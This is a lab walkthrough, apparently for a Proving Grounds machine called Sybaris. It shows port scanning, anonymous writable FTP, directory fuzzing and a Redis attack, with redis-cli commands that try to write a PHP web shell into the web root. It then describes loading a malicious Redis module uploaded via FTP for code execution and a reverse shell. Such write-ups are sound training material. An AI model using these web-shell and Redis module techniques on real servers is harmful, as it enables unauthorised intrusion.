First enumeration with nmap 

`nmap -p- --min-rate 10000 -oN fulltcp.txt -v -Pn <IP>`

```
# Nmap 7.93 scan initiated Fri Jan  6 16:30:10 2023 as: nmap -p- --min-rate 10000 -oN fulltcp.txt -v -Pn 192.168.79.93
Increasing send delay for 192.168.79.93 from 0 to 5 due to 11 out of 28 dropped probes since last increase.
Increasing send delay for 192.168.79.93 from 5 to 10 due to 11 out of 11 dropped probes since last increase.
Nmap scan report for 192.168.79.93
Host is up (0.18s latency).
Not shown: 65528 filtered tcp ports (no-response)
PORT      STATE  SERVICE
21/tcp    open   ftp
22/tcp    open   ssh
53/tcp    closed domain
80/tcp    open   http
6379/tcp  open   redis

Read data files from: /usr/bin/../share/nmap
# Nmap done at Fri Jan  6 16:31:06 2023 -- 1 IP address (1 host up) scanned in 56.23 seconds
```

Now we know the ports that are open, let's run defaults nmap scripts to know what services are running on those ports.

`nmap -sC -sV -oN normal.tcp -p 21,22,80,6379 -Pn <IP>`

```
# Nmap 7.93 scan initiated Fri Jan  6 16:41:25 2023 as: nmap -sC -sV -oN normal.tcp -p 21,22,80,6379 -Pn 192.168.108.93
Nmap scan report for 192.168.108.93
Host is up (0.17s latency).       
                                         
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.2
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 0        0               6 Apr 01  2020 pub [NSE: writeable]
| ftp-syst:                                                                        
|   STAT:                                                                          
| FTP server status:                                                               
|      Connected to 192.168.49.108
|      Logged in as ftp                                                            
|      TYPE: ASCII
|      No session bandwidth limit                                                  
|      Session timeout in seconds is 300                                           
|      Control connection is plain text                                            
|      Data connections will be plain text                     
|      At session startup, client count was 3
|      vsFTPd 3.0.2 - secure, fast, stable    
|_End of status                                                                    
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:                                                                     
|   2048 2194ded36964a84da8f0b50aeabd02ad (RSA)       
|   256 674245198bf5f9a5a4cffb8748a266d0 (ECDSA)
|_  256 f3e229a3411e761eb1b746dc0bb99177 (ED25519)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/7.3.22)
| http-robots.txt: 11 disallowed entries  
| /config/ /system/ /themes/ /vendor/ /cache/ 
| /changelog.txt /composer.json /composer.lock /composer.phar /search/ 
|_/admin/             
|_http-title: Sybaris - Just another HTMLy blog
|_http-server-header: Apache/2.4.6 (CentOS) PHP/7.3.22                                                                                                                
|_http-generator: HTMLy v2.7.5                                                                                                                                        
| http-cookie-flags: 
|   /:                                                                             
|     PHPSESSID:
|_      httponly flag not set
6379/tcp open  redis   Redis key-value store 5.0.9
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jan  6 16:41:40 2023 -- 1 IP address (1 host up) scanned in 14.99 seconds
```

Now we know what ports are open, let's start first by enumerating port 21 (FTP). Anonymous login is allowed

```
┌──(n16hth4wk㉿n16hth4wk-sec)-[~/Documents/PGP/Sybaris]
└─$ ftp 192.168.108.93                                                                                                            
Connected to 192.168.108.93.
220 (vsFTPd 3.0.2)
Name (192.168.108.93:n16hth4wk): anonymous 
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -al
229 Entering Extended Passive Mode (|||10093|).
150 Here comes the directory listing.
drwxr-xr-x    3 0        0              17 Sep 04  2020 .
drwxr-xr-x    3 0        0              17 Sep 04  2020 ..
drwxrwxrwx    2 0        0               6 Apr 01  2020 pub
226 Directory send OK.
ftp> cd pub
250 Directory successfully changed.
ftp> ls -al
229 Entering Extended Passive Mode (|||10095|).
150 Here comes the directory listing.
drwxrwxrwx    2 0        0               6 Apr 01  2020 .
drwxr-xr-x    3 0        0              17 Sep 04  2020 ..
226 Directory send OK.
ftp> put normal.tcp 
local: normal.tcp remote: normal.tcp
229 Entering Extended Passive Mode (|||10093|).
150 Ok to send data.
100% |*************************************************************************************************************************|  1696       26.51 MiB/s    00:00 ETA
226 Transfer complete.
1696 bytes sent in 00:00 (5.16 KiB/s)
ftp> ls -al
229 Entering Extended Passive Mode (|||10094|).
150 Here comes the directory listing.
drwxrwxrwx    2 0        0              24 Jan 06 15:45 .
drwxr-xr-x    3 0        0              17 Sep 04  2020 ..
-rw-rw-rw-    1 14       50           1696 Jan 06 15:45 normal.tcp
226 Directory send OK.
ftp> 
```

nice we have file upload permission in ftp, let's move to the next port 80 (http).

![image](https://user-images.githubusercontent.com/87468669/211047218-c4ec3e85-b49e-421f-96f6-62894b058cd7.png)

As we can se the web service is running htmly cms, i checked online for exploits could not find any. Let's burst hidden directories 

```
┌──(n16hth4wk㉿n16hth4wk-sec)-[~/Documents/PGP/Sybaris]
└─$ ffuf -u "http://192.168.108.93/FUZZ" -w /usr/share/wordlists/dirb/common.txt -fc 403,500 -fs 0,5 -e .txt,.php,.xml,.bak
                                                                                   
        /'___\  /'___\           /'___\        
       /\ \__/ /\ \__/  __  __  /\ \__/        
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\         
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/                         
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/        
                                         
       v1.5.0 Kali Exclusive <3
________________________________________________
                                                                                   
 :: Method           : GET                                                         
 :: URL              : http://192.168.108.93/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Extensions       : .txt .php .xml .bak 
 :: Follow redirects : false                                                                                                                                          
 :: Calibration      : false                                                                                                                                          
 :: Timeout          : 10                                                                                                                                             
 :: Threads          : 40                                                                                                                                             
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500                                                                                           
 :: Filter           : Response status: 403,500                                                                                                                       
 :: Filter           : Response size: 0,5                                                                                                                             
________________________________________________                                                                                                                      
                                                                                                                                                                      
                        [Status: 200, Size: 7884, Words: 2320, Lines: 142, Duration: 208ms]
cache                   [Status: 301, Size: 236, Words: 14, Lines: 8, Duration: 157ms]   
content                 [Status: 301, Size: 238, Words: 14, Lines: 8, Duration: 198ms]   
favicon.ico             [Status: 200, Size: 1150, Words: 4, Lines: 1, Duration: 149ms]
humans.txt              [Status: 200, Size: 1157, Words: 49, Lines: 59, Duration: 167ms]
index                   [Status: 200, Size: 7870, Words: 2318, Lines: 142, Duration: 171ms]
lang                    [Status: 301, Size: 235, Words: 14, Lines: 8, Duration: 171ms]       
LICENSE.txt             [Status: 200, Size: 18092, Words: 3133, Lines: 340, Duration: 185ms]
login                   [Status: 200, Size: 3046, Words: 616, Lines: 69, Duration: 195ms]
robots.txt              [Status: 200, Size: 1154, Words: 112, Lines: 48, Duration: 178ms]
sitemap.xml             [Status: 200, Size: 505, Words: 4, Lines: 1, Duration: 163ms]
system                  [Status: 301, Size: 237, Words: 14, Lines: 8, Duration: 183ms]
themes                  [Status: 301, Size: 237, Words: 14, Lines: 8, Duration: 157ms]
:: Progress: [23070/23070] :: Job [1/1] :: 224 req/sec :: Duration: [0:02:05] :: Errors: 0 ::
```

checked all the directories, i got nothing usefull. Let's move on to the next port 6379 (redis).

```
┌──(n16hth4wk㉿n16hth4wk-sec)-[~/Documents/PGP/Sybaris]
└─$ redis-cli -h 192.168.108.93
192.168.108.93:6379> config set dir /var/www/html
OK
192.168.108.93:6379> config set dbfilename shell.php
OK
192.168.108.93:6379> set test "<?php system($_GET[cmd]); ?>"
OK
192.168.108.93:6379> save
(error) ERR
192.168.108.93:6379> 
```

Loggd in redcli and try to inject a shell but it did not work. since we have file upload access on ftp, why don't we upload a rediscli module.so file.

![image](https://user-images.githubusercontent.com/87468669/211049138-53d74d37-6cea-4c4e-80ff-37b1650cd1c9.png)

Great we got to import the module from the ftp directory. you can get the module.so file in the `/usr/share/metasploit-framework/data/exploits/redis/module.so` or check github.
Now we got RCE, let's get reverse shell.

![image](https://user-images.githubusercontent.com/87468669/211051251-ccb83514-bfe3-4568-a41d-7fc7d011d940.png)

Boom we got reverse shell😎, let's escalate privs esc. 

